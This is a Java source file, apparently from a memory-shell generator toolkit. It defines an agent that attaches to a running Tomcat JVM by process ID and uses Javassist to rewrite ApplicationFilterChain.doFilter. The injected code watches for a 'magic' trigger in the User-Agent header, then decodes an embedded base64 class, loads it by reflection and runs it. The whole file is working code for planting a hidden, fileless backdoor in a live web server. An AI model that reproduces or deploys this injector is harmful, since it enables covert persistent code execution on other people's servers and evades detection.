package jmg.core.template;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;
import java.lang.management.ManagementFactory;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.security.ProtectionDomain;
import java.util.List;

public class TomcatAgentTransformer implements ClassFileTransformer {

    public static final String targetClassName = "org.apache.catalina.core.ApplicationFilterChain";
    public static final String targetMethodName = "doFilter";
    public String injectHeaderName = "User-Agent";

    public String injectHeaderValue = "magic";

    public String getInjectorCode() {
        return "";
    }

    public static void agentmain(String args, Instrumentation instrumentation) throws UnmodifiableClassException {
        instrumentation.addTransformer(new TomcatAgentTransformer(), true);
        for (Class clz : instrumentation.getAllLoadedClasses()) {
            if (!clz.getName().equals(targetClassName)) continue;
            instrumentation.retransformClasses(clz);
        }
    }

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        className = className.replace("/", ".");
        if (className.equals(targetClassName) && classBeingRedefined != null) {
            try {
                ClassPool pool = ClassPool.getDefault();
                pool.insertClassPath(new ClassClassPath(classBeingRedefined));
                CtClass ctClass = pool.getCtClass(className);
                CtMethod ctMethod = ctClass.getDeclaredMethod(targetMethodName);
                String injectorCode = getInjectorCode();
                String code = String.format("if ($1 instanceof javax.servlet.http.HttpServletRequest && $2 instanceof javax.servlet.http.HttpServletResponse) {\n" +
                        "    javax.servlet.http.HttpServletRequest httpRequest = (javax.servlet.http.HttpServletRequest) $1;\n" +
                        "    javax.servlet.http.HttpServletResponse httpResponse = (javax.servlet.http.HttpServletResponse) $2;\n" +
                        "    try {\n" +
                        "        if (httpRequest.getHeader(\"%s\") != null && httpRequest.getHeader(\"%s\").contains(\"%s\")) {\n" +
                        "            String injectorCode = \"%s\";\n" +
                        "            byte[] byteArray;\n" +
                        "            try {\n" +
                        "                Class base64DecoderClazz = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
                        "                byteArray = (byte[]) base64DecoderClazz.getMethod(\"decodeBuffer\", new Class[]{String.class}).invoke(base64DecoderClazz.newInstance(), new Object[]{injectorCode});\n" +
                        "            } catch (Throwable e) {\n" +
                        "                Class base64Clazz = Class.forName(\"java.util.Base64\");\n" +
                        "                Object decoder = base64Clazz.getMethod(\"getDecoder\", null).invoke(base64Clazz, null);\n" +
                        "                byteArray = (byte[]) base64Clazz.getMethod(\"decode\", new Class[]{byte[].class}).invoke(decoder, new Object[]{injectorCode});\n" +
                        "            }\n" +
                        "            java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[0], Thread.currentThread().getContextClassLoader());\n" +
                        "            java.lang.reflect.Method method = ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[]{byte[].class, int.class, int.class});\n" +
                        "            method.setAccessible(true);\n" +
                        "            Class clazz = (Class) method.invoke(classLoader, new Object[]{byteArray, new Integer(0), new Integer(byteArray.length)});\n" +
                        "            clazz.newInstance();\n" +
                        "    }\n" +
                        "    } catch (Exception e) {\n" +
                        "        e.printStackTrace();\n" +
                        "    }\n" +
                        "}", injectHeaderName, injectHeaderName, injectHeaderValue, injectorCode);
                ctMethod.insertBefore(code);
                byte[] bytes = ctClass.toBytecode();
                ctClass.detach();
                return bytes;
            } catch (Exception e) {
                e.printStackTrace();
                return new byte[0];
            }
        }
        return new byte[0];
    }

    private static Class virtualMachineClass;
    private static Class virtualMachineDescriptorClass;
    private static List<Object> vms;

    static {
        try {
            // 获取 tools.jar 的路径
            StringBuilder toolsJarPath = new StringBuilder();
            toolsJarPath.append(System.getProperty("java.home"))
                    .append(File.separator)
                    .append("..")
                    .append(File.separator)
                    .append("lib")
                    .append(File.separator)
                    .append("tools.jar");
            File toolsJarFile = new File(toolsJarPath.toString());

            // 如果 JDK 目录下没有找到 tools.jar（纯JRE）
            if (!toolsJarFile.exists() || !toolsJarFile.isFile()) {
                // 释放内置的 tools.jar
                InputStream jarStream = TomcatAgentTransformer.class.getClassLoader().getResourceAsStream("tools.jar");
                toolsJarFile = File.createTempFile("tools", ".jar");

                FileOutputStream out = null;
                try {
                    out = new FileOutputStream(toolsJarFile);
                    byte[] buffer = new byte[1024];
                    int bytesRead;
                    while ((bytesRead = jarStream.read(buffer)) != -1) {
                        out.write(buffer, 0, bytesRead);
                    }
                } finally {
                    if (out != null) {
                        out.close();
                    }
                }
            }

            // Load the VirtualMachine and VirtualMachineDescriptor classes
            URL url = toolsJarFile.toURI().toURL();
            URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url});
            virtualMachineClass = urlClassLoader.loadClass("com.sun.tools.attach.VirtualMachine");
            virtualMachineDescriptorClass = urlClassLoader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");
            vms = (List) virtualMachineClass.getMethod("list").invoke(virtualMachineClass);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    public static void main(String[] args) throws Exception {
        String jvmProcessId = null;
        if (args.length == 0) {
            // 列出所有 pid
            listAllJvmPids();
        } else {
            try {
                Integer.parseInt(args[0]);
                jvmProcessId = args[0];
                attachAgentToTargetJvm(jvmProcessId);
            } catch (NumberFormatException e) {
                throw new IllegalArgumentException("Argument must be an integer representing a JVM process ID");
            }
        }
    }


    public static void listAllJvmPids() throws Exception {
        for (Object vm : vms) {
            Method displayNameMethod = virtualMachineDescriptorClass.getMethod("displayName");
            String displayName = (String) displayNameMethod.invoke(vm);
            Method getId = virtualMachineDescriptorClass.getDeclaredMethod("id");
            String id = (String) getId.invoke(vm);
            infoLog(String.format("Found pid %s ——> [%s]", id, displayName));
        }
    }

    private static void attachAgentToTargetJvm(String targetPID) throws Exception {
        String agentFilePath = new File(TomcatAgentTransformer.class.getProtectionDomain().getCodeSource().getLocation().getPath()).getCanonicalPath();
        infoLog("Current agent path: " + agentFilePath);
        File agentFile = new File(agentFilePath);
        String currentPid = getCurrentPID();
        if (targetPID.equals(currentPid)) {
            infoLog("Skipping attaching to self");
        } else {
            try {
                infoLog("Attaching to target JVM with PID: " + targetPID);
                Object jvm = virtualMachineClass.getMethod("attach", new Class[]{String.class}).invoke(null, targetPID);
                Method loadAgent = virtualMachineClass.getDeclaredMethod("loadAgent", String.class);
                loadAgent.invoke(jvm, agentFile.getAbsolutePath());
                Method detach = virtualMachineClass.getDeclaredMethod("detach");
                detach.invoke(jvm);
                successLog("Attached to target JVM and loaded agent successfully");
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }
    }

    private static String getCurrentPID() {
        return ManagementFactory.getRuntimeMXBean().getName().split("@")[0];
    }

    public static void infoLog(String message) {
        System.out.println("[*] " + message);
    }

    public static void failLog(String message) {
        System.out.println("[-] " + message);
    }

    public static void successLog(String message) {
        System.out.println("[+] " + message);
    }

}